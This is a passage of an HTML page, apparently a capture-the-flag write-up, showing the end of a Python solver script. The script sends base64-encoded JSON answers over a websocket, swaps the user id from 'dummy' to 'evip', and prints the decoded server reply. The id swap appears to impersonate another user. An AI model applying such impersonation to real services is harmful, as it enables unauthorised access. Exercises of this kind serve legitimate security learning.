+    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        uid <span class="token operator">=</span> <span class="token string">'dummy'</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        uid <span class="token operator">=</span> <span class="token string">'evip'</span>
+    res <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+        <span class="token string">'send_time'</span><span class="token punctuation">:</span> data<span class="token punctuation">[</span><span class="token string">'send_time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">'answer'</span><span class="token punctuation">:</span> data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">'id'</span><span class="token punctuation">:</span> uid
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>res<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+result <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Received:"</span><span class="token punctuation">,</span> b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre></div></div><!--]--></div>
+  
+
+
+</body></html>
